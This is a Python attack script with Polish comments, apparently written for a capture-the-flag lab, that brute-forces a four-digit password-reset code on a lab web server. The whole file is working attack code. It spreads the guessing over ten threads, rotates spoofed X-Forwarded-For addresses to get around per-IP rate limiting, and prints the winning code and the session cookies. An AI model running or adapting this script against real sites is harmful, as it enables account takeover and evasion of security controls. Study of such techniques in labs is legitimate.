import requests
import threading

# Konfiguracja
BASE_URL = "http://10.10.132.180:1337"
RESET_URL = f"{BASE_URL}/reset_password.php"
NUM_THREADS = 10  # Liczba wątków
ATTEMPTS_PER_IP = 7  # Liczba prób przed zmianą IP

# Flaga zatrzymująca brute-force, gdy kod zostanie znaleziony
found = False
found_lock = threading.Lock()

# Rozpoczęcie sesji
session = requests.Session()

# Pobranie ciasteczek sesyjnych
session.get(BASE_URL)

# Wysłanie prośby o reset hasła
session.post(RESET_URL, data={"email": "tester@hammer.thm"})


def brute_force(thread_id, start_code, step):
    """Funkcja brute-force iterująca po kodach z odpowiednim zakresem."""
    global found

    ip_suffix = thread_id  # Każdy wątek startuje z innym adresem IP
    attempts = 0  # Licznik prób przed zmianą IP
    code = start_code  # Każdy wątek zaczyna od innego kodu

    while not found:
        # Formatowanie kodu jako 4-cyfrowy
        code_str = f"{code:04d}"
        headers = {"X-Forwarded-For": f"127.0.0.{ip_suffix}"}  # IP w X-Forwarded-For

        try:
            response = session.post(RESET_URL, data={"recovery_code": code_str, "s": "178"}, headers=headers)
            
            print(f"[Thread-{thread_id}] Trying {code_str} from IP 127.0.0.{ip_suffix} | Status: {response.status_code}")

            if "Invalid or expired" in response.text:
                attempts += 1
                if attempts >= ATTEMPTS_PER_IP:
                    attempts = 0  # Reset liczby prób
                    ip_suffix += NUM_THREADS  # Zwiększamy IP o liczbę wątków, aby uniknąć konfliktów

                code += step  # Przeskok do następnego kodu w zakresie wątku

            else:
                with found_lock:
                    if not found:  # Zapobiega wielokrotnemu wypisywaniu sukcesu
                        found = True
                        print("\n" + "=" * 40)
                        print(f"[*] TOKEN FOUND by Thread-{thread_id}!!!!!")
                        print(f"[*] Correct Code: {code_str}")
                        print(f"[*] Session ID: {session.cookies}")
                        print("=" * 40 + "\n")
                        break

        except requests.exceptions.RequestException as e:
            print(f"[!] Error in Thread-{thread_id}: {e}")
            break


# Tworzenie i uruchamianie wątków
threads = []
for t in range(NUM_THREADS):
    start_code = t  # Każdy wątek zaczyna od innego kodu
    thread = threading.Thread(target=brute_force, args=(t, start_code, NUM_THREADS))
    threads.append(thread)
    thread.start()

# Czekanie na zakończenie wszystkich wątków
for thread in threads:
    thread.join()

print("Brute-force finished.")
